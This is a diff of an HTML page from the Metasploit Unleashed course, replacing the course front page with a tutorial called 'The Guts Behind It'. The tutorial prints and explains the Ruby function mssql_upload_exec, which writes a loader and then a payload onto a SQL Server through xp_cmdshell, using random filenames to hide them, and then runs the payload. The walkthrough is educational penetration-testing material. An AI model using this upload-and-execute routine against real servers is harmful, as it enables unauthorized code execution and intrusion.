@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>The Guts Behind It - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="The_Guts_Behind_It" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:The_Guts_Behind_It&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=The_Guts_Behind_It&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=The_Guts_Behind_It&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,255 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>The Guts Behind It</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="The_Guts_Behind_It#column-one">navigation</a>, <a href="The_Guts_Behind_It#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Looking int the 'mssql.rb' file using a text editor, locate the 'mssql_upload_exec'. We should be presented with the following:
+<br />
+<br />
+<pre>
+#
+# Upload and execute a Windows binary through MSSQL queries
+#
+def mssql_upload_exec(exe, debug=false)
+hex = exe.unpack("H*")[0]
+
+var_bypass = rand_text_alpha(8)
+var_payload = rand_text_alpha(8)
+
+print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+print_status("Writing the debug.com loader to the disk...")
+h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+h2b.split(/\n/).each do |line|
+mssql_xpcmdshell("#{line}", false)
+end
+
+print_status("Converting the debug script to an executable...")
+mssql_xpcmdshell("cmd.exe /c cd %TEMP% &amp;&amp; cd %TEMP% &amp;&amp; debug < %TEMP%\\#{var_bypass}", debug)
+mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)
+
+print_status("Uploading the payload, please be patient...")
+idx = 0
+cnt = 500
+while(idx < hex.length - 1)
+mssql_xpcmdshell("cmd.exe /c echo #{hex[idx,cnt]}>>%TEMP%\\#{var_payload}", false)
+idx += cnt
+end
+
+print_status("Converting the encoded payload...")
+mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
+mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
+mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+
+print_status("Executing the payload...")
+mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+end</pre>
+<br />
+The def mssql_upload_exec(exe, debug=false) requires two parameters and sets the debug to false by default unless otherwise specified.
+<pre>
+def mssql_upload_exec(exe, debug=false)
+</pre>
+<br />
+The hex = exe.unpack("H*")[0] is some Ruby Kung-Fuey that takes our generated executable and magically turns it into hexadecimal for us.
+<pre>
+hex = exe.unpack("H*")[0]
+</pre>
+<br />
+var_bypass = rand_text_alpha(8) and var_payload = rand_text_alpha(8) creates two variables with a random set of 8 alpha characters, for example: PoLecJeX
+<pre>
+var_bypass = rand_text_alpha(8)
+</pre>
+<br />
+The print_status must always be used within Metasploit, 'puts' is no longer accepted in the framework. If you notice there are a couple things different for me vs. python, in the print_status you'll notice "#{var_payload}.exe this subsititues the variable var_payload into the print_status message, so you would essentially see portrayed back "PoLecJeX.exe"
+<pre>
+print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+</pre>
+<br />
+Moving on, the h2b = File.read(datastore['HEX2BINARY'], File.size[datastore['HEX2BINARY'])) will read whatever the file specified in the "HEX2BINARY" datastore, if you look at when we fired off the exploit, it was saying "h2b", this file is located at data/exploits/mssql/h2b, this is a file that I had previously created that is a specific format for windows debug that is essentially a simple bypass for removing restrictions on filesize limit. We first send this executable, windows debug converts it back to a binary for us, and then we send the metasploit payload and call our prior converted executable to convert our metasploit file.
+<pre>
+h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+h2b.split(/\n/).each do |line|
+</pre>
+<br />
+The h2b.gsuc!(/KemneE3N/, "%TEMP%\\#{var_bypass}") is simply substituing a hardcoded name with the dynamic one we created above, if you look at the h2b file, KemneE3N is called on multiple occasions and we want to randomly create a name to obfuscate things a little better. The gsub just substitutes the hardcoded with the random one. 
+<br />
+<br />
+The h2b.split(/\n/).each do |line| will start a loop for us and split the bulky h2b file into multiple lines, reason being is we can't send the entire bulk file over at once, we have to send it a little at a time as the MSSQL protocol does not allow us very large transfers through SQL statements. 
+<br />
+<br />
+Lastly, the mssql_xpcmdshell("#{line}", false) sends the initial stager payload line by line while the false specifies debug as false and to not send the information back to us.
+<br />
+The next few steps convert our h2b file to a binary for us utilizing Windows debug, we are using the&#160;%TEMP% directory for more reliability. The mssql_xpcmdshell strored procedure is allowing
+this to occur.
+<br />
+<br />
+The idx = 0 will server as a counter for us to let us know when the filesize has been reached, and the cnt = 500 specifies how many characters we are sending at a time. The next line sends our payload to a new file 500 characters at a time, increasing the idx counter and ensuring that idx is still less than the hex.length blob. 
+<br />
+<br />
+Once that has been finished the last few steps convert our metasploit payload back to an executable using our previously staged payload then executes it giving us our payload!
+<pre>
+idx = 0
+</pre>
+<br />
+So we've walked through the creation of an overall attack vector and got more familar with what goes on behind the curtains. If your thinking about creating a new module, look around there is usually something that you can use as a baseline to help you create it.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Building_A_Module" title="Building A Module">Building A Module</a> &gt; The Guts Behind It</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Payloads_Through_MSSQL" title="Payloads Through MSSQL">Payloads Through MSSQL</a> &#124; <a href="Creating_Our_Auxiliary_Module" title="Creating Our Auxiliary Module">Creating Our Auxiliary Module</a> &#124; <strong class="selflink">The Guts Behind It</strong></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 520/1000000
+Preprocessor generated node count: 2733/1000000
+Post‐expand include size: 3968/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:115-0!*!0!*!*!*!* and timestamp 20131123163230 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=The_Guts_Behind_It&amp;oldid=1464">http://www.offensive-security.com/w/index.php?title=The_Guts_Behind_It&amp;oldid=1464</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Building_A_Module&amp;action=edit&amp;redlink=1" class="new" title="Category:Building A Module (page does not exist)">Building A Module</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +740,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.131 secs. --></body></html>
